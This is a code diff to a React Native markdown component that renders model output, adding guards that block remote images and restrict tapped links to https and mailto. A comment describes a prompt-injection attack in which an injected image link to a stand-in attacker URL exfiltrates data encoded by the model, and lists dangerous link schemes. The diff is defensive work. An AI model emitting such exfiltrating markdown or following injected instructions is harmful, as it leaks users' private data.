@@ -6,7 +6,13 @@ import RNMarkdown, {
   type RenderRules,
 } from 'react-native-markdown-display';
 
-import { Fonts, Radius, Spacing, Type, type ThemeColor } from '@/constants/theme';
+import {
+  Fonts,
+  Radius,
+  Spacing,
+  Type,
+  type ThemeColor,
+} from '@/constants/theme';
 import { useTheme } from '@/hooks/use-theme';
 import { withAlpha } from '@/lib/color';
 import { CodeBlock } from './code-block';
@@ -33,7 +39,9 @@ function fenceLang(node: ASTNode): string {
 }
 
 function codeText(node: ASTNode): string {
-  return typeof node.content === 'string' ? node.content.replace(/\n$/, '') : '';
+  return typeof node.content === 'string'
+    ? node.content.replace(/\n$/, '')
+    : '';
 }
 
 // Rules that need custom rendering (everything else is styled via `makeStyles`).
@@ -71,9 +79,26 @@ function makeRules(c: ThemeColors): RenderRules {
       </ScrollView>
     ),
     // Inline images via expo-image — bypasses the library's react-native-fit-image.
+    // Remote images are blocked: model output is attacker-influenceable, and a
+    // prompt-injected ![](https://attacker/?d=...) would silently exfiltrate
+    // whatever the model encodes into the URL on auto-load. Only inline data:
+    // images render; anything else falls back to its alt text. (The library's
+    // allowedImageHandlers prop is bypassed by custom rules, so the gate must
+    // live here.)
     image: (node) => {
       const uri = node.attributes?.src as string | undefined;
-      if (!uri) return null;
+      if (!uri || !uri.startsWith('data:image/')) {
+        const alt = node.attributes?.alt as string | undefined;
+        return alt ? (
+          <Text
+            key={node.key}
+            style={{ color: c.mutedForeground, fontStyle: 'italic' }}
+            selectable
+          >
+            {alt}
+          </Text>
+        ) : null;
+      }
       return (
         <Image
           key={node.key}
@@ -94,8 +119,18 @@ function makeStyles(c: ThemeColors, color: ThemeColor) {
   const ink = c[color];
   return StyleSheet.create({
     body: { ...Type.body, color: ink, gap: Spacing.two },
-    heading1: { fontFamily: Fonts.bold, fontSize: 22, color: ink, marginTop: Spacing.one },
-    heading2: { fontFamily: Fonts.semibold, fontSize: 17, color: ink, marginTop: Spacing.one },
+    heading1: {
+      fontFamily: Fonts.bold,
+      fontSize: 22,
+      color: ink,
+      marginTop: Spacing.one,
+    },
+    heading2: {
+      fontFamily: Fonts.semibold,
+      fontSize: 17,
+      color: ink,
+      marginTop: Spacing.one,
+    },
     heading3: { fontFamily: Fonts.semibold, fontSize: 15, color: ink },
     heading4: { fontFamily: Fonts.semibold, fontSize: 15, color: ink },
     heading5: { fontFamily: Fonts.semibold, fontSize: 15, color: ink },
@@ -182,7 +217,17 @@ export function Markdown({
   const rules = useMemo(() => makeRules(c), [c]);
 
   return (
-    <RNMarkdown style={styles} rules={rules}>
+    // onLinkPress: returning true lets the library Linking.openURL the href,
+    // false suppresses it. Only web/mail links may leave the app — anything
+    // else (javascript:, tel:, file:, rinciku:// deep links) stays inert so
+    // model output can't trigger arbitrary schemes.
+    <RNMarkdown
+      style={styles}
+      rules={rules}
+      onLinkPress={(url) =>
+        url.startsWith('https://') || url.startsWith('mailto:')
+      }
+    >
       {content}
     </RNMarkdown>
   );
